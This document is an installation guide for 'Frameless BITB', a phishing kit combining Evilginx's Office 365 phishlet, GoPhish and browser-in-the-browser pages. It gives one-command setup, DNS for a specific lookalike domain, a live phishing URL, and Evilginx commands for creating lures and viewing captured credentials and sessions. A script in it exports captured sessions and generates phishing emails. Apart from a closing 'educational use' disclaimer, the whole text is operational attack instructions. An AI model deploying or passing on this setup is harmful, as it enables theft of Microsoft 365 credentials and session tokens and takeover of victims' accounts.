# 🚀 Frameless BITB - Automated Installation Guide

## ⚡ Quick Install (Google Cloud Shell)

### One-Command Installation

Open Google Cloud Shell and run:

```bash
git clone https://github.com/waelmas/frameless-bitb.git && cd frameless-bitb && sudo bash setup-gcloud.sh
```

That's it! The script will automatically:
- ✅ Install all dependencies (Go, Apache, Evilginx, GoPhish)
- ✅ Configure Apache with SSL
- ✅ Set up Evilginx with O365 phishlet
- ✅ Install and configure GoPhish
- ✅ Configure firewall rules
- ✅ Create systemd services
- ✅ Start all services

## 📋 Pre-Installation Checklist

Before running the installation, ensure:

### 1. DNS Configuration (IMPORTANT!)

Point your domain's DNS to your server:

```
Type: A
Name: exodustraderai.info
Value: YOUR_SERVER_IP

Type: A
Name: *.exodustraderai.info
Value: YOUR_SERVER_IP
```

### 2. Open Google Cloud Shell

Go to: https://cloud.google.com/shell

### 3. Verify Root Access

The script requires sudo/root privileges.

## 🔧 Custom Installation

### Using a Different Domain

```bash
sudo DOMAIN=yourdomain.com EMAIL=admin@yourdomain.com bash setup-gcloud.sh
```

### Using Configuration File

1. Edit the configuration file:
```bash
nano config.env
```

2. Modify settings:
```bash
export DOMAIN="yourdomain.com"
export EMAIL="admin@yourdomain.com"
# ... other settings
```

3. Run installation:
```bash
source config.env
sudo -E bash setup-gcloud.sh
```

## 📦 What Gets Installed

| Component | Version | Purpose |
|-----------|---------|---------|
| **Go** | 1.21.6 | Required for building Evilginx |
| **Evilginx** | Latest | Man-in-the-middle phishing framework |
| **GoPhish** | 0.12.1 | Campaign management platform |
| **Apache2** | Latest | Reverse proxy with content substitution |
| **Certbot** | Latest | SSL certificate management |
| **UFW** | Latest | Firewall configuration |

## 🎯 Installation Process

The automated script performs these steps:

1. **System Update** (2-3 minutes)
   - Updates package repositories
   - Upgrades existing packages

2. **Dependency Installation** (3-5 minutes)
   - Installs Git, Wget, Curl, Make, GCC
   - Installs Apache2 and required modules
   - Installs Certbot for SSL
   - Installs system utilities

3. **Go Installation** (1-2 minutes)
   - Downloads Go 1.21.6
   - Configures Go environment

4. **Evilginx Setup** (3-5 minutes)
   - Clones Evilginx repository
   - Compiles from source
   - Installs phishlets and redirectors
   - Configures for port 8443

5. **GoPhish Installation** (1-2 minutes)
   - Downloads GoPhish binary
   - Configures ports (3333 admin, 8080 phishing)
   - Sets up database

6. **Apache Configuration** (2-3 minutes)
   - Enables required modules
   - Configures reverse proxy
   - Sets up content substitution
   - Creates virtual hosts

7. **SSL Certificate Setup** (2-5 minutes)
   - Attempts Let's Encrypt (if DNS configured)
   - Falls back to self-signed certificates
   - Configures Apache SSL

8. **Frameless BITB Setup** (1-2 minutes)
   - Copies page templates
   - Installs custom substitution rules
   - Configures O365 phishlet
   - Updates domain references

9. **Firewall Configuration** (1 minute)
   - Enables UFW
   - Opens required ports
   - Configures security rules

10. **Service Creation** (1 minute)
    - Creates systemd services
    - Enables auto-start on boot
    - Creates management scripts

11. **Service Startup** (1 minute)
    - Starts Apache
    - Starts Evilginx
    - Starts GoPhish

**Total Installation Time: 15-30 minutes**

## ✅ Post-Installation Verification

Run the validation script:

```bash
sudo bash test-setup.sh
```

This will check:
- ✓ System requirements
- ✓ Network configuration
- ✓ Required packages
- ✓ Service status
- ✓ Port availability
- ✓ SSL certificates
- ✓ File structure
- ✓ Web endpoints
- ✓ Configuration files
- ✓ Firewall rules

## 🔑 Access Your Installation

### Phishing Page
```
https://login.exodustraderai.info/?auth=2
```

### GoPhish Admin Panel
```
https://YOUR_SERVER_IP:3333
```

First login will display default credentials - **change immediately!**

### Service Management

```bash
# Check status
bitb-status

# View logs
bitb-logs

# Restart services
bitb-stop
bitb-start
```

## 📊 Evilginx Management

### Access Evilginx Console

```bash
cd /opt/evilginx
tmux attach-session -t evilginx
# Or start new session:
tmux new-session -s evilginx
./evilginx -developer
```

### Common Evilginx Commands

```
# View configuration
config

# List phishlets
phishlets

# Enable phishlet
phishlets enable O365

# Create lure
lures create O365

# Get lure URL
lures get-url 0

# View sessions
sessions

# View captured credentials
sessions [ID]
```

### Detach from Tmux

Press: `Ctrl+B` then `D`

## 🔗 GoPhish Integration

Sync Evilginx sessions to GoPhish:

```bash
sudo bash gophish-integration.sh
```

Features:
1. **Extract Sessions** - Pull data from Evilginx database
2. **Real-time Monitoring** - Watch for new captures
3. **Export to CSV** - Save sessions for analysis
4. **Create Campaigns** - Import into GoPhish
5. **Email Templates** - Generate phishing emails

## 🎨 Customization

### Change Domain After Installation

```bash
# Update configuration files
sudo sed -i 's/exodustraderai\.info/newdomain.com/g' /etc/apache2/sites-enabled/000-default.conf
sudo sed -i 's/exodustraderai\.info/newdomain.com/g' /var/www/*/script.js
sudo sed -i 's/exodustraderai\.info/newdomain.com/g' /var/www/*/index.html

# Restart Apache
sudo systemctl restart apache2
```

### Switch BITB Browser Style

Edit Apache config:
```bash
sudo nano /etc/apache2/sites-enabled/000-default.conf
```

Change from:
```apache
Include /etc/apache2/custom-subs/mac-chrome.conf
```

To:
```apache
Include /etc/apache2/custom-subs/win-chrome.conf
```

Restart Apache:
```bash
sudo systemctl restart apache2
```

### Customize Landing Pages

```bash
# Home page (base domain)
sudo nano /var/www/home/index.html

# Background page
sudo nano /var/www/primary/index.html

# Scripts
sudo nano /var/www/primary/script.js
```

## 🐛 Troubleshooting

### Installation Failed

1. Check error messages in terminal
2. Run validation script:
   ```bash
   sudo bash test-setup.sh
   ```
3. Check logs:
   ```bash
   bitb-logs
   ```

### Apache Won't Start

```bash
# Check configuration
sudo apache2ctl configtest

# View errors
sudo tail -f /var/log/apache2/error.log

# Check port conflicts
sudo netstat -tulpn | grep :443
```

### Evilginx Won't Start

```bash
# Check logs
sudo journalctl -u evilginx -f

# Fix DNS stub listener
sudo sed -i 's/#DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved

# Restart Evilginx
sudo systemctl restart evilginx
```

### SSL Certificate Issues

```bash
# For Let's Encrypt
sudo certbot certificates
sudo certbot renew --dry-run

# For manual wildcard cert
sudo certbot certonly --manual \
  --preferred-challenges dns \
  -d exodustraderai.info \
  -d *.exodustraderai.info
```

### Port Already in Use

```bash
# Find process using port
sudo lsof -i :443
sudo lsof -i :80

# Kill process or stop service
sudo systemctl stop [service_name]
```

### Domain Not Resolving

```bash
# Check DNS
dig exodustraderai.info
dig login.exodustraderai.info

# Flush DNS cache (on client)
# Windows: ipconfig /flushdns
# Mac: sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder
# Linux: sudo systemd-resolve --flush-caches
```

## 🔒 Security Best Practices

### 1. Change Default Passwords

```bash
# GoPhish admin password
# Change on first login via web interface
```

### 2. Configure IP Whitelisting

Edit GoPhish config:
```bash
sudo nano /opt/gophish/config.json
```

Add trusted IPs:
```json
{
  "admin_server": {
    "listen_url": "YOUR_IP:3333"
  }
}
```

### 3. Enable HTTPS Only

Ensure all traffic uses SSL:
```bash
# Already configured in Apache setup
# Redirect HTTP to HTTPS is automatic
```

### 4. Monitor Logs Regularly

```bash
# Set up log rotation
sudo nano /etc/logrotate.d/bitb

# Add:
/var/log/apache2/*.log {
    daily
    rotate 7
    compress
    delaycompress
}
```

### 5. Keep Software Updated

```bash
# System updates
sudo apt update && sudo apt upgrade -y

# Update Evilginx (see QUICKSTART.md)
# Update GoPhish (see QUICKSTART.md)
```

## 📁 Directory Structure Reference

```
/opt/
├── evilginx/
│   ├── evilginx              # Main binary
│   ├── phishlets/            # Phishing templates
│   │   └── O365.yaml         # Office 365 phishlet
│   └── redirectors/          # Redirect configurations
│
├── gophish/
│   ├── gophish               # Main binary
│   ├── config.json           # Configuration
│   ├── gophish.db            # SQLite database
│   └── static/               # Web assets
│
└── frameless-bitb/
    └── [backup of original files]

/var/www/
├── home/                     # Base domain landing page
│   ├── index.html
│   ├── style.css
│   ├── script.js
│   └── images/
│
├── primary/                  # Background page
│   ├── index.html
│   ├── styles.css
│   ├── script.js
│   └── images/
│
└── secondary/                # BITB window
    ├── script.js
    ├── mac-chrome.css
    ├── win-chrome.css
    └── images/

/etc/apache2/
├── sites-enabled/
│   └── 000-default.conf      # Main Apache config
└── custom-subs/
    ├── mac-chrome.conf       # Mac Chrome BITB rules
    └── win-chrome.conf       # Windows Chrome BITB rules

/root/.evilginx/
├── config.json               # Evilginx config
└── data.db                   # Evilginx database (sessions)

/etc/systemd/system/
├── evilginx.service          # Evilginx service
└── gophish.service           # GoPhish service

/usr/local/bin/
├── bitb-start                # Start all services
├── bitb-stop                 # Stop all services
├── bitb-status               # Check status
└── bitb-logs                 # View logs
```

## 🔄 Backup and Restore

### Backup

```bash
# Create backup directory
sudo mkdir -p /backups

# Backup Evilginx
sudo tar -czf /backups/evilginx-$(date +%Y%m%d).tar.gz /root/.evilginx/

# Backup GoPhish
sudo tar -czf /backups/gophish-$(date +%Y%m%d).tar.gz /opt/gophish/gophish.db

# Backup Apache configs
sudo tar -czf /backups/apache-$(date +%Y%m%d).tar.gz /etc/apache2/

# Backup web pages
sudo tar -czf /backups/www-$(date +%Y%m%d).tar.gz /var/www/
```

### Restore

```bash
# Restore Evilginx
sudo tar -xzf /backups/evilginx-YYYYMMDD.tar.gz -C /

# Restore GoPhish
sudo tar -xzf /backups/gophish-YYYYMMDD.tar.gz -C /

# Restart services
bitb-stop
bitb-start
```

## 🎓 Learning Resources

- [Evilginx Official Documentation](https://help.evilginx.com/)
- [Evilginx Mastery Course](https://academy.breakdev.org/evilginx-mastery)
- [GoPhish User Guide](https://docs.getgophish.com/)
- [Original BITB by mrd0x](https://github.com/mrd0x/BITB)
- [Apache mod_substitute](https://httpd.apache.org/docs/2.4/mod/mod_substitute.html)

## ⚠️ Legal Disclaimer

**EDUCATIONAL USE ONLY**

This tool is designed for:
- ✅ Authorized security testing
- ✅ Security research
- ✅ Educational purposes
- ✅ Red team exercises with permission

**Unauthorized use is illegal and unethical.**

By using this tool, you agree to:
- Only test systems you own or have explicit permission to test
- Comply with all applicable laws and regulations
- Use responsibly and ethically
- Accept full responsibility for your actions

The authors are not responsible for misuse of this software.

## 🆘 Getting Help

### Check Documentation
1. Read this INSTALL.md
2. Read QUICKSTART.md
3. Run validation: `sudo bash test-setup.sh`

### Common Issues
- See [Troubleshooting](#-troubleshooting) section
- Check service logs: `bitb-logs`
- Verify configuration: `bitb-status`

### Community Support
- GitHub Issues: https://github.com/waelmas/frameless-bitb/issues
- Original Author: [@waelmas](https://github.com/waelmas)

## 📝 Version History

### v2.0 - Automated Installation (Current)
- ✅ Fully automated Google Cloud Shell setup
- ✅ GoPhish integration
- ✅ Systemd service management
- ✅ Validation and testing scripts
- ✅ Comprehensive documentation

### v1.0 - Manual Installation
- Original manual setup process
- Local VM installation only

## 🙏 Credits

- **Original BITB Concept**: [@mrd0x](https://github.com/mrd0x)
- **Frameless BITB**: [@waelmas](https://github.com/waelmas)
- **Evilginx**: [@kgretzky](https://github.com/kgretzky)
- **GoPhish**: [GoPhish Team](https://github.com/gophish/gophish)

## 📄 License

For educational and authorized testing purposes only.

---

**Made with ❤️ for security research and education**

**Happy (Ethical) Phishing! 🎣**
